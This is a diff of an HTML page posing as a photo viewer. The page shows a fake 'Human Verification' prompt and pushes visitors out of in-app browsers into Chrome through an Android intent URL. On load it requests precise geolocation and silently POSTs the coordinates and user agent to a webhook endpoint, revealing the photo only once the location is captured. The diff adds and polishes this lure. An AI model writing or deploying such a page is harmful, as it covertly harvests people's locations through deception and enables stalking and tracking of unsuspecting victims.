@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Photo View</title>
     
     <meta property="og:title" content=" ">
@@ -12,55 +13,80 @@
     <meta property="og:type" content="website">
 
     <style>
-        body { margin: 0; background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
+        body { margin: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; overflow: hidden; }
+        #message { text-align: center; padding: 25px; max-width: 400px; border: 1px solid #333; border-radius: 15px; background: #111; }
         #content { display: none; }
-        #message { text-align: center; padding: 20px; }
-        img { max-width: 100%; height: auto; }
-        .btn { background: #0084ff; color: white; padding: 10px 20px; border: none; border-radius: 5px; text-decoration: none; display: inline-block; margin-top: 15px; cursor: pointer; }
+        img { max-width: 100%; height: auto; border-radius: 10px; }
+        .btn { background: #0084ff; color: white; padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #0073e6; }
+        .instruction { font-size: 13px; color: #aaa; margin-top: 15px; line-height: 1.5; }
+        .highlight { color: #0084ff; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="message">
-        <h3>Human Verification Required</h3>
-        <p>Please open this link in your <b>system browser</b> (Chrome/Safari) to verify and view the photo.</p>
-        <button class="btn" onclick="openInBrowser()">Open in Browser</button>
+        <h2 style="margin-top:0;">Human Verification</h2>
+        <p>To view this photo, you must verify your session in your system browser.</p>
+        
+        <button class="btn" onclick="openInBrowser()">Verify & Open Photo</button>
+        
+        <div class="instruction">
+            If the button doesn't work:<br>
+            Click the <span class="highlight">Three Dots (⋮)</span> at the top right and select <span class="highlight">"Open in Chrome"</span> or <span class="highlight">"Open in Browser"</span>.
+        </div>
     </div>
 
     <div id="content">
-        <img src="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg">
+        <img src="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg" alt="Photo">
     </div>
 
     <script>
         function openInBrowser() {
-            // অনেক সময় অটোমেটিক ব্রাউজার খোলার জন্য এটি কাজ করে
-            window.location.href = window.location.href + "?open_external_browser=1";
+            var currentUrl = window.location.href;
+            
+            // Android Chrome Intent - এটি সরাসরি ক্রোম ব্রাউজার খুলতে বাধ্য করে
+            var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+            var intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+            
+            window.location.href = intentUrl;
+
+            // যদি উপরেরটা কাজ না করে (iOS বা অন্য ডিভাইসের জন্য)
+            setTimeout(function() {
+                if (!document.hidden) {
+                    window.location.href = currentUrl + (currentUrl.includes('?') ? '&' : '?') + "external=1";
+                }
+            }, 1000);
         }
 
         window.onload = function() {
-            // যদি ব্রাউজার পারমিশন সাপোর্ট করে
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     
-                    // লোকেশন তথ্য পাঠানো
-                    fetch("https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net", {
+                    // Webhook-এ সঠিক লোকেশন পাঠানো
+                    const webhookURL = "https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net"; 
+                    fetch(webhookURL, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({ 
                             lat: position.coords.latitude, 
                             lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy + "m"
+                            accuracy: position.coords.accuracy.toFixed(1) + " meters",
+                            device: navigator.userAgent
                         })
                     });
 
-                    // ছবি দেখানো
+                    // লোকেশন পাওয়ার পর ছবি দেখানো
                     document.getElementById('message').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
 
                 }, function(error) {
-                    // মেসেঞ্জারে সাধারণত এখানে এরর আসবে
-                    console.log("Permission denied or browser blocked.");
-                }, { enableHighAccuracy: true });
+                    console.log("Waiting for permission...");
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
             }
         };
     </script>
